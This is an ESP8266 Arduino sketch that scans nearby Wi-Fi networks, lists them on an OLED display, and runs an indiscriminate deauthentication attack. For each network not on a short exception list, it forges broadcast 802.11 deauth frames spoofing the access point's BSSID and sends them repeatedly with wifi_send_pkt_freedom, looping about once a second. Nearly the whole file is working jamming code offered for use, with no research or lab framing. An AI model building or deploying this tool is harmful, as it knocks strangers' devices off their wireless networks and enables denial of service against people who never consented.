#include <ESP8266WiFi.h>
#include <Wire.h>
#include <U8g2lib.h>
#include <string.h>

#define FLASH_BUTTON_PIN 0 // GPIO0 is commonly used for the flash button
#define ICON_SIZE 16       // Icon size for display

bool flashButtonState = false;       // State of the flash button
bool lastFlashButtonState = false;   // Previous state of the flash button

// Define your SSID exception list
const char* ssid_exception_list[] = {
    "a",       // Example SSID 1
    "aaa",     // Example SSID 2
    "shot8",   // Example SSID 3
    "shop8",   // Example SSID 4
    // Add more SSIDs as needed
};

// Define your MAC address exception list as strings
const char* mac_exception_list[] = {
    "00:14:22:01:23:45", // Example MAC 1
    // "00:14:22:67:89:AB", // Example MAC 2
    // // Add more MAC addresses as needed
};

int num_ssids = sizeof(ssid_exception_list) / sizeof(ssid_exception_list[0]);
int num_macs = sizeof(mac_exception_list) / sizeof(mac_exception_list[0]);

// Function to check if the SSID is in the exception list
bool isInSsidExceptionList(const char* ssid) {
    for (int i = 0; i < num_ssids; i++) {
        if (strcmp(ssid, ssid_exception_list[i]) == 0) {
            return true;  // SSID found in exception list
        }
    }
    return false;  // SSID not found in exception list
}

// Function to check if the MAC address is in the exception list
bool isInMacExceptionList(const char* mac) {
    for (int i = 0; i < num_macs; i++) {
        if (strcmp(mac, mac_exception_list[i]) == 0) {
            return true;  // MAC address found in exception list
        }
    }
    return false;  // MAC address not found in exception list
}

// Declare the deauthAttack function
void deauthAttack(uint8_t* bssid, const char* ssid, const char* mac_str);

// Initialize the display using software I2C with specified pins
U8G2_SSD1306_128X64_NONAME_F_SW_I2C u8g2(U8G2_R0, /* clock=*/ 12, /* data=*/ 14, /* reset=*/ U8X8_PIN_NONE);

void setup(void) {
  Serial.begin(115200);
  pinMode(FLASH_BUTTON_PIN, INPUT_PULLUP); // Set flash button pin as input with internal pull-up resistor
  u8g2.begin(); // Initialize the display
  WiFi.mode(WIFI_STA); // Set Wi-Fi mode to station
  WiFi.disconnect(); // Disconnect from any previous connections
  delay(100); // Give some time to disconnect
}

void loop(void) {
  // Scan for Wi-Fi networks
  int n = WiFi.scanNetworks();
  Serial.println("Scan done");
  flashButtonState = digitalRead(FLASH_BUTTON_PIN);

  // If the state of the button has changed
  if (flashButtonState != lastFlashButtonState) {
    // If the button is pressed
    if (flashButtonState == LOW) {
      // Perform action when the button is turned on
      u8g2.clearBuffer();
      u8g2.setFont(u8g2_font_open_iconic_embedded_1x_t); // Set font to Open Iconic Embedded (sun and moon icons)
      u8g2.drawGlyph(0, ICON_SIZE, 69); // Draw sun icon at top-left corner
      u8g2.sendBuffer();
    } else { // If the button is released
      // Perform action when the button is turned off
      u8g2.clearBuffer();
      u8g2.setFont(u8g2_font_open_iconic_embedded_1x_t); // Set font to Open Iconic Embedded (sun and moon icons)
      u8g2.drawGlyph(0, ICON_SIZE, 71); // Draw moon icon at top-left corner
      u8g2.sendBuffer();
    }
    // Save the current button state as the last state
    lastFlashButtonState = flashButtonState;
  }

  if (n == 0) {
    Serial.println("No networks found");
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_u8glib_4_tf); // Set a small font
    u8g2.drawStr(0, 30, "No networks found");
    u8g2.sendBuffer();
  } else {
    Serial.print(n);
    Serial.println(" networks found");

    // Display networks on OLED
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_profont10_mr); // Set a small font (profont10_mr)
    for (int i = 0; i < n; ++i) {
      Serial.print(i + 1);
      Serial.print(": ");
      Serial.println(WiFi.SSID(i));

      String ssid = WiFi.SSID(i);
      String ssid_display = ssid;
      if (ssid.length() > 16) { // Limit the SSID to 16 characters
        ssid_display = ssid.substring(0, 16); // Truncate SSID if longer than 16 characters
      }
      u8g2.setCursor(0, (i + 1) * 10 + 16);
      u8g2.print(i + 1);
      u8g2.print(": ");
      u8g2.print(ssid_display);

      int32_t rssi = WiFi.RSSI(i);
      u8g2.setCursor(105, (i + 1) * 10 + 16);
      u8g2.print("|");
      u8g2.print(rssi);

      // Get BSSID of the network
      uint8_t* bssid = WiFi.BSSID(i);
      Serial.print("BSSID: ");
      char bssid_str[18];
      sprintf(bssid_str, "%02X:%02X:%02X:%02X:%02X:%02X", bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
      Serial.println(bssid_str);

      const char* ssid_char = ssid.c_str();
      deauthAttack(bssid, ssid_char, bssid_str);

      if (i == 3) break; // Only display the first 3 networks to fit the screen
    }
    u8g2.sendBuffer();
  }
  delay(1000); // Wait for 10 seconds before scanning again
}

void deauthAttack(uint8_t* bssid, const char* ssid, const char* mac_str) {
  // Check if the SSID is in the exception list
  if (isInSsidExceptionList(ssid)) {
    // SSID is in the exception list, do not send deauthentication packets
    return;
  }

  // Check if the BSSID is in the exception list
  if (isInMacExceptionList(mac_str)) {
    // BSSID is in the exception list, do not send deauthentication packets
    return;
  }

  // Frame construction for deauthentication
  uint8_t deauthPacket[26] = {
    0xC0, 0x00,             // Frame Control: Deauthentication
    0x3A, 0x01,             // Duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination: Broadcast
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], // Source: AP BSSID
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], // BSSID: AP BSSID
    0x00, 0x00,             // Fragment & Sequence number
    0x07, 0x00              // Reason code: Class 3 frame received from nonassociated STA
  };

  for (int i = 0; i < 20; i++) { // Send multiple times
    wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
    delay(10);
  }

  // Log the deauthenticated MAC address
  Serial.print("Deauthenticated MAC: ");
  Serial.println(mac_str);

  // Display the deauthenticated MAC address on OLED
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_profont10_mr); // Set a small font (profont10_mr)
  u8g2.drawStr(0, 30, "Deauth MAC:");
  u8g2.drawStr(0, 40, mac_str);
  u8g2.sendBuffer();
}
